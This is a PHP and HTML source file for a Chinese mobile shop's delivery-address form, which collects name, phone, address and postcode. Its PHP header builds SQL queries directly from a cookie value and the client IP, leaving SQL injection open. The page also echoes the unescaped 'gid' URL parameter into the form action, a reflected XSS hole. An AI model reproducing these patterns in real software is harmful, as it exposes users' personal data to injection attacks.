<?php 
Define('PM_CALL',true);
Define('INC_CALL',true);
include dirname(__FILE__).('/../canshu/global.class.php');
include dirname(__FILE__).('/../config/mysql.func.php');
include dirname(__FILE__).('/../config/Conn.php');
include dirname(__FILE__).('/../canshu/getdata.php');

$xzshijian=date('Y-m-d H:i:s', time());
$ip=getIP();

//先重新将商品ID写入另一个命名的COOKIE中，然后再销毁商品页生成的商品ID的COOKIE

if($_COOKIE['GoodsID3']){
	
		//判断操作记录数据是否存在，存在就更新此数据状态为2订单页和时间
	$_OID = _fetch_array("SELECT * FROM useraddress WHERE uip='{$ip}' AND gid='{$_COOKIE['GoodsID3']}'");
	if($_OID){
		_query("
			UPDATE 
				useraddress
			SET 
				state=3,
				utime='{$xzshijian}'
			WHERE 
				uip='{$ip}'AND gid='{$_COOKIE['GoodsID3']}' LIMIT 1") or die(mysql_error());
					
		  _close();
		  session_destroy();
		  
	}

}
?>
<!DOCTYPE html>
<!-- saved from url=(0000)http:// -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">
<title>管理收货地址</title>
<link rel="stylesheet" type="text/css" href="./image/style.css">
<link rel="stylesheet" type="text/css" href="./image/area.css">
<style type="text/css">
.foot {
    width: 100%;
    height: 4rem;
    background: #f00;
    line-height: 4rem;
    position: fixed;
    bottom: 0;
    left: 0;
    font-size: 1.5rem;
    display: flex;
}
.foot-right {
    position: absolute;
    right: 0;
    top: 0;
    width: 100%;
    height: 4rem;
}
.foot-right button {
    display: inline-block;
    width: 100%;
    height: 4rem;
    outline: none;
    border: none;
    background: #fe4543;
    font-size: 1.5rem;
    color: #fff;
    text-align: center;
}
</style>
</head>
<body style="">
<form name="submitForm" method="post" action="post_data.php?gid=<?php echo $_GET['gid'];?>" id="submitForm">
	<div class="headh">
		<div class="head-xiao">
			<div>
				<a href="order.php">
					<img src="./image/prev.png" alt="">
				</a>
				
			</div>
			<div>管理收货地址</div>
			<div></div>
		</div>
	</div>
	<div class="ui-form-item ui-border-b">
		<div class="ui-select yihang" id="expressArea">
			<div>
				<input data-name="custUa" name="custUa" class="inp" data-required="true" data-label="单位地址" placeholder="选择省市区" readonly="" style="padding-left:0;">
			</div>
			<div class="yihang_b">
				<img src="./image/next.png" alt="">
			</div>
		</div>
		<div class="browser">

			<!--选择地区弹层-->
			<section id="areaLayer" class="express-area-box">
				<header>
					<h3>选择省市区</h3>
					<div class="selet-area-wrap">
						<p><span class="one"> </span></p>
						<p><span class="two" onClick=";"></span></p>
						<p><span class="three"></span></p>
					</div>
					<a id="backUp" class="back" href="javascript:void(0)" title="返回" style="display: none;"></a>
					<a id="closeArea" class="close" href="javascript:void(0)" title="关闭"></a>
				</header>
				<article id="areaBox">
					<ul id="areaList" class="area-list"><li onClick="selectP(0,1);">北京市</li><li onClick="selectP(1,1);">天津市</li><li onClick="selectP(2,1);">河北省</li><li onClick="selectP(3,1);">河南省</li><li onClick="selectP(4,1);">山西省</li><li onClick="selectP(5,1);">山东省</li><li onClick="selectP(6,1);">内蒙古自治区</li><li onClick="selectP(7,1);">辽宁省</li><li onClick="selectP(8,1);">吉林省</li><li onClick="selectP(9,1);">黑龙江省</li><li onClick="selectP(10,1);">上海市</li><li onClick="selectP(11,1);">江苏省</li><li onClick="selectP(12,1);">浙江省</li><li onClick="selectP(13,1);">福建省</li><li onClick="selectP(14,1);">江西省</li><li onClick="selectP(15,1);">安徽省</li><li onClick="selectP(16,1);">湖北省</li><li onClick="selectP(17,1);">湖南省</li><li onClick="selectP(18,1);">广东省</li><li onClick="selectP(19,1);">广西壮族自治区</li><li onClick="selectP(20,1);">海南省</li><li onClick="selectP(21,1);">重庆市</li><li onClick="selectP(22,1);">四川省</li><li onClick="selectP(23,1);">贵州省</li><li onClick="selectP(24,1);">云南省</li><li onClick="selectP(25,1);">西藏自治区</li><li onClick="selectP(26,1);">陕西省</li><li onClick="selectP(27,1);">甘肃省</li><li onClick="selectP(28,1);">青海省</li><li onClick="selectP(29,1);">宁夏回族自治区</li><li onClick="selectP(30,1);">新疆维吾尔自治区</li><li onClick="selectP(31,1);">台湾省</li><li onClick="selectP(32,1);">香港特别行政区</li><li onClick="selectP(33,1);">澳门特别行政区</li></ul>
				</article>
			</section>
			<!--遮罩层-->
			<div id="areaMask" class="mask"></div>
		</div>
	</div>
	<div class="guan">
		<div class="guan-inp">
			<input type="text" placeholder="请输入街道" value="" name="region" id="address_province" style="-webkit-user-select:auto;">
		</div>
		<div class="yihang_b"><img src="./image/next.png" alt=""></div>
	</div>
	<div class="guan">
		<div class="guan-inp">
			<input type="text" placeholder="请输入详细地址" value="" name="address" id="address_detail" style="-webkit-user-select:auto;">
		</div>
		<div class="yihang_b"><img src="./image/next.png" alt=""></div>
	</div>
	<div class="guan">
		<div class="guan-inp">
			<input type="text" placeholder="请输入收货人姓名" value="" name="name" id="sname" style="-webkit-user-select:auto;">
		</div>
		<div class="yihang_b"><img src="./image/next.png" alt=""></div>
	</div>
	<div class="guan">
		<div class="guan-inp">
			<input type="text" placeholder="请输入收货人联系电话" value="" name="tel" id="smobil" style="-webkit-user-select:auto;">
		</div>
		<div class="yihang_b"><img src="./image/next.png" alt=""></div>
	</div>
	<div class="guan">
		<div class="guan-inp">
			<input type="text" placeholder="请输入邮编" value="" name="zipcode" style="-webkit-user-select:auto;">
		</div>
		<div class="yihang_b"><img src="./image/next.png" alt=""></div>
	</div>
	<div id="saveBtn" class="foot">
			<div class="foot-right">
				<button>保存地址</button>
			</div>
		</div>
		</form>
	<script src="./image/jquery.min.js" type="text/javascript" charset="utf-8"></script>
	<script src="./image/jquery.area.js" type="text/javascript" charset="utf-8"></script>
<script type="text/javascript">
    $(function () {
        $("#saveBtn").click(function(){
            //alert("22");
            var sname = $("#sname").val();
            var smobil = $("#smobil").val();
            var address_province = $("#address_province").val();
            var address_detail = $("#address_detail").val();

            if (sname == "") {
                alert("请输入收货人姓名！");
                return false;
            }
            if (smobil == "") {
                alert("请输入电话号码！");
                return false;
            }
            if (address_province == "") {
                alert("请输入所在地区！");
                return false;
            }
            if (address_detail == "") {
                alert("请输入详细地址！");
                return false;
            }
            $('[name=submitForm]').submit();
        });    
    });
</script>

</body></html>